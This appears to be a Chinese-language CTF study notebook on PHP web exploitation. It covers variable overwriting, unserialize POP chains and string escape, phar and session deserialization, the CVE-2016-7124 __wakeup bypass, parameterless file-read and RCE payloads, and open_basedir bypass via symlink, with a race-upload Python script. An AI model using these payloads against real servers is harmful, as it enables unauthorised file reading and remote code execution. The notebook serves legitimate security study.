[TOC]

## PHP变量覆盖

```php
<?php
$hello = "world";
$b = "hello";
echo $$b; // echo $hello;

// 输出 world
```

### parse_str()

*`void parse_str(string $str[, array &$result])`*

把查询字符串解析到变量中

>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。
>
>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。

https://www.runoob.com/php/func-string-parse-str.html

```php
<?php
$str = "first=value&arr[]=foo+bar&arr[]=baz";

// 推荐用法
parse_str($str, $output);
echo $output['first'];  // value
echo $output['arr'][0]; // foo bar
echo $output['arr'][1]; // baz

// 不建议这么用
parse_str($str);
echo $first;  // value
echo $arr[0]; // foo bar
echo $arr[1]; // baz
?> 
```

### extract ()

*`int extract (array &$array)`*

从数组中将变量导入到当前的符号表

该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。

该函数返回成功设置的变量数目。

![image-20230717004044838](daydayup.assets/image-20230717004044838.png)

https://www.runoob.com/php/func-array-extract.html

```php
<?php

$size = "large";
$var_array = array("color" => "blue",
                   " size"  => "medium",
                   "shape" => "sphere");
extract($var_array, EXTR_PREFIX_SAME, "exist");

echo "$color, $size, $shape, $exist_size\n";

?> 
```

*<u>awctf --- 变量覆盖？</u>*

*<u>buuctf --- [[BJDCTF2020]Mark loves cat](https://buuoj.cn/challenges#[BJDCTF2020]Mark%20loves%20cat)</u>*

>　　$_SERVER["QUERY_STRING"]获取查询语句，实例中可知，获取的是?后面的值
>
>　　$_SERVER["REQUEST_URI"] 获取[http://www.xxx.com](http://www.xxx.com/)后面的值，包括/
>
>　　$_SERVER["SCRIPT_NAME"] 获取当前脚本的路径，如：index.php
>
>　　$_SERVER["PHP_SELF"] 当前正在执行脚本的文件名
>
>​		例子：http://www.xxx.com/index.php?p=222&q=biuuu
>
>　　结果：
>
>　　$_SERVER["QUERY_STRING"] = “p=222&q=u”
>
>　　$_SERVER["REQUEST_URI"] = “/index.php?p=222&q=u”
>
>　　$_SERVER["SCRIPT_NAME"] = “/index.php”
>
>　　$_SERVER["PHP_SELF"] = “/index.php”

## PHP反序列化

PHP类与对象：类、对象、方法、属性

序列化与反序列化：

- `string serialize ( mixed $value )`

  用于序列化对象或数组，并返回一个字符串。

  注意：如果属性是保护和私有的属性，那么他们序列化后的属性名会被特殊字符包裹

- `mixed unserialize ( string $str )`

  用于将通过`serialize()`函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。

如何造成的反序列化？首先就是**要有可用的魔术方法作为“跳板”，且存在一些只要参数可控就会造成破坏的函数调用。**

1. 直接控制`unserialize()`的参数值

   pop链的构造：<u>*awctf --- HE-ezser*</u>

   <u>*adminpage*</u>

2. 文件读取操作

   phar压缩文件
   
   <u>*codeinlog*</u>

### PHP反序列化字符串逃逸

[PHP反序列化字符逃逸详解_filter反序列化_zhang三的博客-CSDN博客](https://blog.csdn.net/qq_45521281/article/details/107135706)

php代码序列化后的基本格式：

```
O:<length>:"<class name>":<n>:{
<field type 1>:<field length 1>:"<field name 1>";<field value type 1>:<field value 1>;
...
<field type n>:<field length n>:"<field name n>";<field value type n>:<field value n>;} 
```

- O:表示序列化的事对象
- < length>:表示序列化的类名称长度
- < class name>：表示序列化的类的名称
- < n >:表示被序列化的对象的属性个数
- {…………}：属性列表
- < field type >：属性类型
- < field length >：属性名长度
- < field name >：属性名
- < field value type >：属性值类型
- < field value >：属性值



![image-20230717010044564](daydayup.assets/image-20230717010044564.png)

此类题目的本质就是改变序列化字符串的长度，导致反序列化漏洞

这种题目有个共同点：

1. php序列化后的字符串经过了替换或者修改，导致字符串长度发生变化。
2. 总是先进行序列化，再进行替换修改操作。

**序列化后导致字符串变长**：<u>*awctf --- 蒸滴简单*</u>

```php
<?php
function filter($str){
    return str_replace('bb', 'ccc', $str);
}
class A{
    public $name='aaaa';
    public $pass='123456';
}
$a=new A();
echo serialize($a)."\n";
$res=filter(serialize($a));

$c=unserialize($res);
echo $c->name;
?>
```

**序列化后导致字符串变短**：<u>*buuctf --- [安洵杯 2019]easy_serialize_php*</u>

```php
<?php
function str_rep($string){
	return preg_replace( '/php|test/','', $string);
}

$test['name'] = '111phpphpphpphpphpphptest';
$test['sign'] ='111";s:4:"sign";s:3:"222";s:6:"number";s:4:"2023";}'; 
$test['number'] = '2020';
$temp = str_rep(serialize($test));
printf($temp);
$fake = unserialize($temp);
echo "\n";
print("name:".$fake['name']."\n");
print("sign:".$fake['sign']."\n");
print("number:".$fake['number']."\n");

```

![image-20230717110730005](daydayup.assets/image-20230717110730005.png)

### phar反序列化

https://blog.csdn.net/q20010619/article/details/120833148

**要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件**

phar文件是php里类似于JAR的一种打包文件本质上是一种压缩文件，在PHP 5.3 或更高版本中默认开启，一个phar文件一个分为四部分：a.phar

>1.a stub
>
>​    可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件
>
>2.a manifest describing the contents
>
>​	phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方
>
>3.the file contents
>
>被压缩文件的内容
>
>4.[optional] a signature for verifying Phar integrity (phar file format only)
>
>​	签名，放在文件末尾、

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("asdas<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

meta-data是以序列化的形式存储的

php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下

![img](daydayup.assets/1687876180147-90a3db65-cf9b-42a9-adf8-b6acf2582b52-16894035091502.png)

phar协议要求：

- php大于5.3.0
- 需要将php.ini的参数phar.readonly设置为off

**漏洞利用条件**

1. phar文件要能够上传到服务器端。
2. 要有可用的魔术方法作为“跳板”。
3. 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤

#### 将phar伪造成其他格式的文件

如果文件上传界面后端代码会检查文件类型的话，就需要将 phar 文件未造成其他格式文件

由于php识别phar文件是通过其文件头的stub，更确切一点来说是`__HALT_COMPILER();`这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件

>474946383961, .gif, "GIF 89A"
>
>474946383761, .gif, "GIF 87A"

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

![image-20230717012512791](daydayup.assets/image-20230717012512791.png)

#### 绕过phar关键字检测

```
if (preg_match("/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i",$filename){
    die();
}
```

绕过方法

```
// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///home/sx/test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
// 还可以使用伪协议的方法绕过
php://filter/resource=phar:///test.phar/test.txt
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

#### 绕过__HALT_COMPILER特征检测

因为phar中的`a stub`字段必须以`__HALT_COMPILER();`字符串来结尾，否则`phar`扩展将无法识别这个文件为`phar`文件，所以这段字符串不能省略，只能绕过

**方法一：**

首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了`__HALT_COMPILER()`，将 phar.gz 后缀改为 png（png文件可以上传）

![image-20230717014558838](daydayup.assets/image-20230717014558838.png)

```
filename=phar://pharppp.phar.gz/pharppp.phar
```

**方法二**

将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则

```
$phar_file = serialize($exp);
    echo $phar_file;
    $zip = new ZipArchive();
    $res = $zip->open('1.zip',ZipArchive::CREATE); 
    $zip->addFromString('crispr.txt', 'file content goes here');
    $zip->setArchiveComment($phar_file);
    $zip->close();
```

这篇文章在php源码角度给出分析：https://www.anquanke.com/post/id/240007

> phar反序列化过程中，对metadata进行解析的时候会进行`php_var_unserialize()`将Phar中的metadata进行反序列化

<u>*ctfshow --- 276*</u>

<u>*BUUCTF --- [NCTF2019]phar matches everything*</u>

```python
#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import requests
import threading

flag = False
url = "http://8f6f1872-fd37-4431-a005-55b6b4e1d2a2.challenge.ctf.show/"
data = open('./phar.phar', 'rb').read()

pre_resp = requests.get(url)
if pre_resp.status_code != 200:
    print(url + ' -> nonono')
    exit(1)

def upload():
    global flag
    while not flag:
        requests.post(url+"?fn=phar.phar", data=data)


def read():
    global flag
    while not flag:
        r = requests.post(url+"?fn=phar://phar.phar/", data="")
        if "ctfshow{" in r.text and flag is False:
            print(r.text)
            flag = True

if __name__ == "__main__":
    a = threading.Thread(target=upload)
    b = threading.Thread(target=read)
    a.start()
    b.start()
    a.join()
    b.join()
```

### session反序列化

先说一下 PHP 处理 session 的一些细节信息。

PHP 在存储 session 的时候会进行序列化，读取的时候会进行反序列化。它内置了多种用来序列化/反序列化的引擎，用于存取 `$_SESSION` 数据：

1. `php`: 键名 + `|` + 经过 `serialize()`/`unserialize()` 处理的值。这是现在默认的引擎。
2. `php_binary`: 键名的长度对应的 ASCII 字符 + 键名 + 经过 `serialize()`/`unserialize()` 处理的值
3. `php_serialize`: 直接使用 `serialize()`/`unserialize()` 函数。(php>=5.5.4)

session 相关的信息，可以在 phpinfo 里查到：

![image-20230802004423865](daydayup.assets/image-20230802004423865.png)

1. `session.auto_start`: 是否自动启动一个 session
2. `session.save_path`: 设置 session 的存储路径
3. `session.save_handler`: 设置保存 session 的函数
4. `session.serialize_handler`: 设置用来序列化/反序列化的引擎
5. `session.upload_progress.enabled`: 启用上传进度跟踪，并填充$ _SESSION变量，默认启用
6. `session.upload_progress.cleanup`: 读取所有POST数据（即完成上传）后立即清理进度信息，默认启用

在我这个 PHP 的配置中，不会自动记录 session，session 内容是以文件方式来存储的（文件以 `sess_` + sessionid 命名）；由于存储的路径为空，所以运行的时候需要指定一下；序列化/反序列引擎为 `php`。

```
┌──(root💀kali)-[/home/soyamilk/桌面]
└─# php ser_session.php                     
                                                                                                                                                                                                     
┌──(root💀kali)-[/home/soyamilk/桌面]
└─# php -d 'session.serialize_handler=php_binary' ser_session.php 
                                                                                                                                                                                                     
┌──(root💀kali)-[/home/soyamilk/桌面]
└─# php -d 'session.serialize_handler=php_serialize' ser_session.php
```

![image-20230802010208399](daydayup.assets/image-20230802010208399.png)

**进行利用：**

不同的序列化/反序列化引擎对数据处理方式不同，造成了安全问题。

引擎为 php_binary 的时候，暂未发现有效的利用方式，所以目前主要还是 php 与 php_serialize 两者混用的时候导致的问题。

phpinfo

![image-20230802022848180](daydayup.assets/image-20230802022848180.png)

set_session.php

```php
<?php
    ini_set('session.serialize_handler', 'php_serialize');
    ini_set('session.save_path', 'D:\phpstudy_pro\WWW\PHP_session_unserialize_demo\session_save');
	session_start();
	$_SESSION['name0'] = 'wi1shu';
    if (array_key_exists('payload', $_GET)){
        $_SESSION['name1'] = $_GET['payload'];
    }else{
        $_SESSION['name1'] = '"|s:6:"wi1shu';
    }

    print_r(session_id());
```

unserialize_session.php

```php
<?php
    ini_set('session.save_path', 'D:\phpstudy_pro\WWW\PHP_session_unserialize_demo\session_save');
    session_start();
    var_dump($_SESSION);
```

![image-20230802022701424](daydayup.assets/image-20230802022701424.png)

php 引擎的格式为：键名 + `|` + 经过 `serialize()`/`unserialize()` 处理的值。那么对于这个例子来说，name 就是 `a:2:{s:5:"name0";s:6:"wi1shu";s:5:"name1";s:13:""`，`s:6:"wi1shu";}` 就是待反序列化的值。那么这里就非常清楚了，本质上就是通过 `|` 来完成注入（`"` 负责闭合引号，防止解析错误），让 php 引擎误以为前面全是 name，这样参与反序列化的数据就可以由我们来控制了。

举个例子

test_session.php

```php
<?php
highlight_file(__FILE__);
ini_set('session.save_path', dirname(__FILE__).'\session_save');
class f4ke{
    public $name;
    function __wakeup(){
        echo "Whata rey oud oing?";
    }
    function __destruct(){
        eval($this->name);
    }
}

session_start();
var_dump($_SESSION);
$str = new f4ke();
?>
```

结合 set_session.php 就能够实现反序列化命令执行

![image-20230802030859010](daydayup.assets/image-20230802030859010.png)

![image-20230802030934064](daydayup.assets/image-20230802030934064.png)

![image-20230802030952533](daydayup.assets/image-20230802030952533.png)

###  CVE-2016-7124

这是一个 PHP 的 CVE，影响版本：

1. PHP5 < 5.6.25
2. PHP7 < 7.0.10

当序列化字符串中表示对象中属性个数的数字，大于真正的属性个数时，就会跳过 `__wakeup` 函数的执行（会触发两个长度相关的 `Notice: Unexpected end of serialized data`）。

>我的猜测，PHP绕过`__wakeup()`是因为`__wakeup`在反序列化完成之后进行，包括正常的反序列化完成和反序列化报错，而当表示对象中属性个数的数字大于真正的属性个数时，就会导致反序列化是一个没有完成的状态，也就是直接将对象反序列化到一个不完整的状态。这将绕过 `__wakeup()` 函数的执行，因为 PHP 无法通过未知的属性来检查对象的完整性。

demo.php

```php
<?php
highlight_file(__FILE__);
class A {
    public $test;

    function __wakeup() {
        $this->test = new B;
    }

    function __destruct() {
        $this->test->check();
    }
}

class B {
    function check() {
        echo phpversion()."\n";
    }
}

class C {
    public $boom;
    function check() {
        eval($this->boom);
    }
}

if (isset($_GET['payload'])){
    $user = unserialize($_GET['payload']);
}else{
    $user = new A();
    $user->test = new B();
}
```

```
O:1:"A":1:{s:4:"test";O:1:"C":1:{s:4:"boom";s:10:"phpinfo();";}}
修改为
O:1:"A":1:{s:4:"test";O:1:"C":1:{s:4:"boom";s:10:"phpinfo();";}}
即可执行payload
```

![image-20230802172523687](daydayup.assets/image-20230802172523687.png)

![image-20230802172704900](daydayup.assets/image-20230802172704900.png)

## 无参数读文件

### 查看当前目录文件名

- `localeconv()`：返回一包含本地数字及货币格式信息的数组。而数组第一项就是`.`

  ![image-20230719173153265](daydayup.assets/image-20230719173153265.png)

- `current()`：返回数组中的单元，默认取第一个值，或者使用`pos(localeconv());`，`pos`是`current`的别名，如果都被过滤还可以使用`reset()`，该函数返回数组第一个单元的值，如果数组为空则返回 `FALSE`

  ![image-20230719173326469](daydayup.assets/image-20230719173326469.png)

- `chr(46)`就是字符`.`

  ```
  构造46的几个方法
  chr(rand()) (不实际，看运气)
   
  chr(time())
   
  chr(current(localtime(time())))
  ```

  `chr(time())`：`chr()`函数以256为一个周期，所以`chr(46)`,`chr(302)`,`chr(558)`都等于`.`，所以使用`chr(time())`，一个周期必定出现一次`.`

  ![image-20230719173621207](daydayup.assets/image-20230719173621207.png)

  `chr(current(localtime(time())))`：数组第一个值每秒+1，所以最多60秒就一定能得到46，用`current`或者`pos`就能获得`.`

  ![image-20230719173926887](daydayup.assets/image-20230719173926887.png)

- `phpversion()`：返回PHP版本，如`5.5.9`

  `floor(phpversion())`返回 `5`

  `sqrt(floor(phpversion()))`返回`2.2360679774998`

  `tan(floor(sqrt(floor(phpversion()))))`返回`-2.1850398632615`

  `cosh(tan(floor(sqrt(floor(phpversion())))))`返回`4.5017381103491`

  `sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))`返回`45.081318677156`

  `ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))`返回`46`

  `chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))`返回`"."`

- `crypt()`：

  `hebrevc(crypt(arg))`可以随机生成一个hash值，第一个字符随机是`$`(大概率) 或者 `"."`(小概率) 然后通过`chr(ord())`只取第一个字符

  ps：`ord()`返回字符串中第一个字符的Ascii值

  `print_r(scandir(chr(ord(hebrevc(crypt(time()))))));//（多刷新几次）`

  ![image-20230719182620374](daydayup.assets/image-20230719182620374.png)

  同理：`strrev(crypt(serialize(array())))`也可以得到`"."`，只不过`crypt(serialize(array()))`的点出现在最后一个字符，需要使用`strrev()`逆序，然后使用`chr(ord())`获取第一个字符

  `print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));`

  ![image-20230719183135310](daydayup.assets/image-20230719183135310.png)

  PHP的函数如此强大，获取`"."`的方法肯定还有许多

  正常的，我们还可以用`print_r(scandir('绝对路径'));`来查看当前目录文件名

  获取绝对路径可用的有`getcwd()`和`realpath('.')`

  所以我们还可以用`print_r(scandir(getcwd()));`输出当前文件夹所有文件名

### 读取当前目录文件

![image-20230719184112763](daydayup.assets/image-20230719184112763.png)

`show_source(end(scandir(getcwd())));`或者用`readfile`、`highlight_file`、`file_get_contents` 等读文件函数都可以（使用`readfile`和`file_get_contents`读文件，显示在源码处）

ps：`readgzfile()`也可读文件，常用于绕过过滤

`array_reverse()`： 以相反的元素顺序返回数组，本来在最后一位，反过来就成为第一位，可以直接用`current`或者`pos`读取

`show_source(current(array_reverse(scandir(getcwd()))));`

如果是倒数第二个我们可以用：`show_source(next(array_reverse(scandir(getcwd()))));`

>`next()` 函数用于将数组内部的指针向后移动，并返回当前指针位置的下一个元素的值。
>
>```
>$fruits = array("apple", "banana", "orange");
>echo current($fruits); // Output: "apple"
>
>next($fruits); // 移动指针到下一个元素
>echo current($fruits); // Output: "banana"
>
>next($fruits); // 移动指针到下一个元素
>echo current($fruits); // Output: "orange"
>
>next($fruits); // 移动指针到下一个元素，此时没有下一个元素，返回 false
>echo current($fruits); // Output: false
>在上述示例中，通过使用 next() 函数，我们将数组指针从第一个元素移动到第二个元素，然后再移动到第三个元素，最后移动到了最后一个元素后返回了 false
>```

如果不是数组的最后一个或者倒数第二个呢？

我们可以使用`array_rand(array_flip())`，`array_flip()`是交换数组的键和值，`array_rand()`从数组中随机选择一个或多个键，并返回选定的键或键的数组

所以我们可以用：`show_source(array_rand(array_flip(scandir(getcwd()))));`

或者：`show_source(array_rand(array_flip(scandir(current(localeconv())))));`

（可以自己结合前面总结的构造`"."`的方法切合实际过滤情况读取，后文就只列举简单的语句）

### 查看上一级目录文件名

`dirname()` ：返回路径中的目录部分，比如：

![image-20230719190241851](daydayup.assets/image-20230719190241851.png)

如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径

`chdir()` ：改变当前工作目录返回值为`bool`

- dirname()方法

  `print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件`

  `chdir(dirname(getcwd())); //设置上级目录为运行目录`

- 构造`..`

  我们`scandir(getcwd())`出现的数组第二个就是`".."`，所以可以用`next()`获取`print_r(next(scandir(getcwd())));`

  结合上文的一些构造都是可以获得`..`的 ：`next(scandir(chr(ord(hebrevc(crypt(time()))))))`

### 读取上级目录文件

直接`print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));`是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录

前面写到了`chdir()`，使用：`show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));`即可改变当前目录为上一层目录并读取文件：

![image-20230720172405756](daydayup.assets/image-20230720172405756.png)

如果不能使用`dirname()`，可以使用构造`..`的方式切换路径并读取：

但是这里切换路径后`getcwd()`和`localeconv()`不能接收参数，因为语法不允许，我们可以用之前的`hebrevc(crypt(arg))`

这里`crypt()`和`time()`可以接收参数，于是构造：

```
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));
或更复杂的：show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
还可以用：show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
```

还有一种构造方法`if()`：（这种更直观些，并且不需要找可接收参数的函数）

`if(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));`

### 查看和读取多层上级路径

**查看多层上级路径：**

`scandir(dirname(chdir(next(scandir(dirname(chdir(dirname(getcwd()))))))));`
![image-20230720172811801](daydayup.assets/image-20230720172811801.png)

`scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(current(localeconv()))))))))))))))));` 要刷新很久，建议配合burp爆破使用
![image-20230720175902183](daydayup.assets/image-20230720175902183.png)

**读取多层上层路径文件：**

`array_rand(array_flip(scandir(dirname(chdir(next(scandir(dirname(chdir(dirname(getcwd()))))))))));`
![image-20230720172840411](daydayup.assets/image-20230720172840411.png)

`array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(current(localeconv()))))))))))))))))));`		建议配合burp爆破使用

![image-20230720180542945](daydayup.assets/image-20230720180542945.png)

### 查看和读取根目录文件

`hebrevc(crypt(arg))`或`crypt(arg)`所生成的字符串最后一个字符有几率是`/`，再用`strrev()`反转再获取第一位字符就有几率获得`/`（读根目录文件需要有权限）

`chr(ord(strrev(hebrevc(crypt(time())))))`
![image-20230720182030861](daydayup.assets/image-20230720182030861.png)

同样的：

    if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));


也可以查看根目录文件，但是也会受到权限限制，不一定成功

读根目录文件：(也是需要权限)

    if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));

## 无参数命令执行（RCE）

```php
<?php
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) { 
    eval($_GET['code']);
}
?>
```

我们可以使用无参数函数任意读文件，也可以执行命令：

既然传入的`code`值不能含有参数，那我们可不可以把参数放在别的地方，`code`用无参数函数来接收参数呢？这样就可以打破无参数函数的限制：

首先想到请求头参数`headers`，因为`headers`我们用户可控

![image-20230720205606433](daydayup.assets/image-20230720205606433.png)



### getallheaders()和apache\_request\_headers()

`getallheaders()`是`apache_request_headers()`的别名函数，但是该函数只能在`Apache`环境下使用，任何`header`头部都可利用：

先查看哪个参数在第一位，然后直接修改第一位的`header`参数为payload，然后选择到它执行即可。

![image-20230720205743373](daydayup.assets/image-20230720205743373-16898578643871.png)

`system(next(getallheaders()))`
![image-20230720210218241](daydayup.assets/image-20230720210218241.png)
![image-20230720210359355](daydayup.assets/image-20230720210359355.png)

### get\_defined\_vars()

该函数会返回全局变量的值，如get、post、cookie、file数据，返回一个多维数组，所以需要使用两次取数组值：

![image-20230720210916892](daydayup.assets/image-20230720210916892.png)
![image-20230720211215175](daydayup.assets/image-20230720211215175.png)

```
system(current(next(get_defined_vars())))
```

如何利用file变量进行rce呢？

>python发送文件
>
>```python
>import requests
>
>if __name__ == "__main__":
>    url = 'http://192.168.0.103/norce/index.php'
>    # burp抓包查看文件包
>    proxy = {
>       'http': '127.0.0.1:8080',
>       'https': '127.0.0.1:8080'
>    }
>    # 单个文件
>    # "uploadName": ("filename", "fileobject", "content-type", {"headers": "arg"})
>    r_file = {
>       'data': ('data', "1", "image/jpeg", {"aa": 'bb'})
>    }
>    # 多个文件
>    r_files = {
>        'data1': ('data_1', "1", "image/jpeg", {"aa": 'bb'}),
>        'data2': ('data_2', "2", "image/jpeg")
>    }
>    r_files_2 = [('image1', ('1.png', '1', 'image/png', {"aa": "bb"})),
>                 ('image2', ('2.png', '2', 'image/png'))]
>    r = requests.post(url=url, headers=header, files=r_files_2, proxies=proxy)
>    print(r.text)
>```
>
>![image-20230720220418361](daydayup.assets/image-20230720220418361.png)

这里要注意的是，file数组在最后一个，需要end定位，因为payload直接放在文件的名称上，再pos两次定位获得文件名

`print_r(system(pos(current(end(get_defined_vars())))))`
![image-20230720220701015](daydayup.assets/image-20230720220701015.png)

### get_defined_functions()

`get_defined_functions()`：用于获取当前脚本环境中所有已定义的函数。它会返回一个多维数组，其中包含两个主要元素：一组内置（内部）函数的列表和一组用户定义函数的列表。

```php
<?php
// 定义一个用户函数
function myCustomFunction() {
    // 函数内容
}

// 获取所有已定义的函数
$definedFunctions = get_defined_functions();

// 打印内置函数
print_r($definedFunctions['internal']);

// 打印用户定义的函数
print_r($definedFunctions['user']);
?>
```

通过获取内置函数数组从而获取到危险函数，根据不同版本的php有不同的索引，需要自己测试将其检索出来

![image-20240423125540695](daydayup.assets/image-20240423125540695.png)

![image-20240423125655607](daydayup.assets/image-20240423125655607.png)

### session_id()

`session_id()`：可以用来获取/设置 当前会话 ID。

session需要使用`session_start()`开启，然后返回参数给`session_id()`

但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）

但是`hex2bin()`函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用`hex2bin()`即可

`if(session_start())var_dump(eval(hex2bin(session_id())));`

![image-20230720224417366](daydayup.assets/image-20230720224417366.png)

>PHP7.3.4只能用这种方式来实现，PHP5可以不使用if而是把`session_start()`嵌套在`session_id()`里面
>
>PHP7.3.4
>![image-20230720224449551](daydayup.assets/image-20230720224449551.png)
>
>PHP5.4.45
>`var_dump(eval(hex2bin(session_id(session_start()))));`
>![image-20230720224842929](daydayup.assets/image-20230720224842929.png)
>
>而PHP7.3.4使用嵌套方式`session_id()`就会返回`false`
>![image-20230720225131291](daydayup.assets/image-20230720225131291.png)
>
>初步判定是因为`session_start()`开启成功后会返回1，导致`session_id()`内有参数，让PHP以为是要修改PHPSESSID，从而导致无法获取到PHPSESSID

### getenv()

`getenv()` ：获取环境变量的值(在PHP7.1之后可以不给予参数)

所以该函数只适用于PHP7.1之后版本，否则会出现：`Warning: getenv() expects exactly 1 parameter, 0 given in ...`报错



  

`getenv()` 可以用来收集信息，实际利用一般无法达到命令执行效果，因为默认的`php.ini`中，`variables_order`值为：`GPCS`

也就是说系统在定义PHP预定义变量时的顺序是 `GET,POST,COOKIES,SERVER`，没有定义`Environment(E)`，你可以修改`php.ini`文件的 `variables_order`值为你想要的顺序，如：`"EGPCS"`。这时，`$_ENV`的值就可以取得了

![](daydayup.assets/format,png-168951187500036.png)

我们来看修改后的值：（环境不同，环境变量显示也不同）

![](daydayup.assets/format,png-168951187500137.png)

对此我们可以加以利用，方法同上文：

![](daydayup.assets/format,png-168951187500138-16898684188512.png)

## PHP绕过open_basedir

[PHP绕过open_basedir列目录的研究 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)

[PHP绕过open_basedir限制操作文件的方法_lonmar~的博客-CSDN博客](https://blog.csdn.net/weixin_45551083/article/details/110109369)

[open_basedir绕过 - Von的博客 | Von Blog (v0n.top)](https://www.v0n.top/2020/07/10/open_basedir绕过/)

**关于`open_basedir`：**

pen_basedir是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域，假设`open_basedir=/home/wwwroot/home/web1/:/tmp/`，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。
注意用open_basedir指定的限制实际上是前缀,而不是目录名，举例来说: 若"open_basedir = /dir/user", 那么目录 “/dir/user” 和 "/dir/user1"都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。

**关于软连接：**

[Linux 命令之软连接详解_linux 软连接_LawsonAbs的博客-CSDN博客](https://blog.csdn.net/liu16659/article/details/83714066)

软链接文件有类似于Windows的快捷方式。它实际上是一个特殊的文件。在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。

路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身。

### 命令执行函数

由于open_basedir的设置对system等命令执行函数是无效的，所以我们可以使用命令执行函数来访问限制目录。

当我们设置好open_basedir之后，通过`file_get_contents()`去读取其他目录的文件，执行效果如图
![image-20230722160854725](daydayup.assets/image-20230722160854725.png)

很明显我们无法直接读取open_basedir所规定以外的目录文件。接下来通过`system()`来实现相同的功能

![image-20230722161517469](daydayup.assets/image-20230722161517469.png)

通过命令执行函数绕过open_basedir来读取flag，由于命令执行函数一般都会被限制在disable_function当中，所以我们需要寻找其他的途径来绕过限制。

### symlink()函数

我们先来了解一下`symlink()`函数

```
bool symlink ( string $target , string $link )
```

`symlink()`函数将建立一个指向target的名为link的符号链接，当然一般情况下这个target是受限于open_basedir的。

我们可以通过symlink完成一些逻辑上的绕过导致可以跨目录操作文件。

open_bashedir配置：`open_basedir = /var/www/html/`

首先在/var/www/html/slink.php中 编辑slink.php的内容为

```php
<?php
  //phpinfo();
  highlight_file(__FILE__);
  mkdir("./a");
  chdir("./a");
  mkdir("./b");
  chdir("./b");
  chdir("../");
  chdir("../");
  symlink("./a/b","tmplink");
  symlink("tmplink/../../flag","exp");
  unlink("tmplink");
  mkdir("tmplink");
  echo file_get_contents("http://127.0.0.1/exp");
?>
```

接着在/var/www/中新建一个flag文件内容为`flag{Hack!}`

![image-20230722181700956](daydayup.assets/image-20230722181700956.png)

正常读一下内容
![image-20230722182048849](daydayup.assets/image-20230722182048849-16900212512641.png)

